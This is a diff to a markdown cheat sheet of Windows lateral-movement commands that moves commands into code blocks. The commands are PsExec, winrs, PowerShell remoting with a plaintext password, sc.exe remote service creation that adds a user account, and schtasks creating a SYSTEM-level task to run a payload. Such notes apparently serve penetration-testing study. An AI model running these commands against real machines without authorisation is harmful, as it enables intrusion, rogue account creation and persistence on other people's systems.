@@ -14,7 +14,9 @@
 
 ### Example: 
 
-#### psexec64.exe \\MACHINE_IP -u Administrator -p PASSWORD -i cmd.exe
+#### 
+
+    psexec64.exe \\MACHINE_IP -u Administrator -p PASSWORD -i cmd.exe
 
 # WINRM
 
@@ -22,23 +24,37 @@
 
 ## Group Memberships: Remote Managenemt Users
 
-#### winrs.exe -u:Administrator -p PASSWORD -r:TARGET cmd
+#### 
+
+    winrs.exe -u:Administrator -p PASSWORD -r:TARGET cmd
 
 # POWERSHELL
 
 ## Steps:
 
-#### 1) $username= 'Administrator';
+#### 1) 
 
-#### 2) $password= 'PASSWORD';
+    $username= 'Administrator';
 
-#### 3) #securepassword = ConvertTo-SecureString $password -AsPlaintext -Force;
+#### 2) 
 
-#### 4) $credential = New-Object System.Management.Automation.PSCredential $username, $securepassword;
+    $password= 'PASSWORD';
 
-#### Enter-PSSession -Computername TARGET -Credential $credential
+#### 3) 
 
-#### Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
+    $securepassword = ConvertTo-SecureString $password -AsPlaintext -Force;
+
+#### 4) 
+
+    $credential = New-Object System.Management.Automation.PSCredential $username, $securepassword;
+
+#### 
+
+    Enter-PSSession -Computername TARGET -Credential $credential
+
+#### 
+
+    Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
 
 # SC
 
@@ -46,19 +62,33 @@
 
 ## Group Memberships: Administrators
 
-#### 1) sc.exe \\TARGET create SERVICE binPath= "net user USER PASS /add" start= auto
+#### 1) 
 
-#### 2) sc.exe \\TARGET start SERVICE
+    sc.exe \\TARGET create SERVICE binPath= "net user USER PASS /add" start= auto
 
-#### 3) sc.exe \\TARGET stop SERVICE
+#### 2) 
 
-#### 4) sc.exe \\TARGET delete SERVICE
+    sc.exe \\TARGET start SERVICE
+
+#### 3) 
+
+    sc.exe \\TARGET stop SERVICE
+
+#### 4) 
+
+    sc.exe \\TARGET delete SERVICE
 
 # SCHEDULED TASKS REMOTE CREATION
 
-#### 1) schtasks /s TARGET /ru "SYSTEM" /create /tn "task" /tr "COMMAND/PAYLOAD TO EXECUTE" /sc ONCE /sd 01/01/1970 /st 00:00:00
+#### 1) 
 
-#### 2) schtasks /s TARGET /run /tn ""task"
+    schtasks /s TARGET /ru "SYSTEM" /create /tn "task" /tr "COMMAND/PAYLOAD TO EXECUTE" /sc ONCE /sd 01/01/1970 /st 00:00:00
 
-#### 3) schtasks /s TARGET /tn "task" /DELETE /F
+#### 2) 
+
+    schtasks /s TARGET /run /tn ""task"
+
+#### 3) 
+
+    schtasks /s TARGET /tn "task" /DELETE /F
 
